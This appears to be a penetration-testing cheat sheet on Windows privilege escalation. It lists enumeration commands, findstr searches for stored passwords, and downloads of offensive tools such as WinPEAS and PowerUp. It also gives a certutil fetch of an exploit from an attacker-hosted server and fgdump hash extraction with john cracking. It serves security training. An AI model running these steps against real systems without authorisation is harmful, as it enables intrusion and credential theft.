---
title: Windows Privilege Escalation
layout: default
nav_order: 2
parent: Privilege Escalation

---

# Windows Privilege Escalation
{: .no_toc }
## Table of Contents
{: .no_toc .text-delta }
1. TOC
{:toc}
### System Enum

Get System Information
```bash
systeminfo
```
Grabbing OS Name and Version
```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
View patches
```bash
wmic qfe
```

```bash
wmic qfe get caption,Description,HotFixId,InstalledOn
```

Get list of Drives
```bash
wmic logicaldisk get caption,description,providername
```



### User Enum
Get current user
```bash
whoami
```
Get current user privileges
```bash
whoami /priv
```

Get list of groups current user is inside of
```bash
whoami /groups
```

List users on machine
```bash
net user
```

```bash
net user $USER
```

Query group membership

```bash
net localgroup
```

```bash
localgroup <group name>
```

### Network Enum
List IP addresses and network configs
```bash
ipconfig /all
```

Dump arp cache 
```bash
arp -a
```
*Note: If the IP Address for `arp -a` is different from the default gateway or DNS, it could be a sign of the machine being connected to an AD Domain Controller.*

List route table 
```bash
route print
```

List ports and listening ports
```bash
netstat -ano
```

### Password Searching

Searching for passwords in current directory
```bash
findstr /si password *.txt *.ini *.config 
```
```bash
findstr /si Password: *.txt *.ini *.config 
```

```bash
findstr /si Username: Password: *.txt *.ini *.config 
```

```bash
findstr /si password= *.txt *.ini *.config 
```

### Antivirus Enum

Discovering AV (Windows Defender)
```bash
sc query windefend
```

Discovering services
```bash
sc query type=service
```

Discovering firewalls 
```bash
netsh advfirewall firewall dump
```
Discovering firewalls (Legacy) 
```bash
netsh firewall show state
```

Firewall config 
```bash
netsh firewall show config
```

### Automated Tools 
Tools that perform automated privesc enum on Windows boxes: 

#### WinPEAS

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe
```
*If WinPEASany.exe fails, it may either be blocked by antivirus or the target **does not have .NET version 4.0**. Try to run WinPEAS.bat instead.*

#### Seatbelt

```bash
https://github.com/GhostPack/Seatbelt
```

#### Watson

```bash
https://github.com/rasta-mouse/Watson
```

#### SharpUp

```bash
https://github.com/GhostPack/SharpUp
```

#### windows-exploit-suggester

```bash
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
```

#### Sherlock.ps1

```bash
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
```

#### PowerUp.ps1

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

#### jaws-enum.ps1

```bash
wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
```

### Kernel Exploits


1. Run `windows-exploit-suggester.py` and choose an exploit from the listed output
<br />
<br />
```bash
python windows-exploit-suggester.py --database $DB --systeminfo /path/to/sysinfo.txt
```
2. Run lightweight python server on Kali machine to host exploit executable: 
```bash
python3 -m http.server 80
```
3. Navigate to `temp` folder on windows target: 
<br />
<br />
```bash
cd C:\Windows\temp
```
4. Use `Certutil` to grab exploit from kali machine: 
<br />
<br />
```bash
certutil -urlcache -f http://$IP/Exploit.exe
```
5. Run the exploit

### Extracting Windows Hashes via fgdump.exe
You can extract password hashes via transferring `fgdump.exe`

1. Copy `fgdump.exe` to current directory: 
<br>
<br>
```powershell
cp /usr/share/windows-resources/binaries/fgdump.exe  .  
```

2. Transfer the file to target
3. Run `fgdump.exe` 
<br>
<br>
```powershell
fgdump.exe
```

4. Transfer the `127.0.0.1.pwdump` or `.pwdump` file to the attack machine: 
5. Crack the `pwdump` file with `john`: 
```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
```




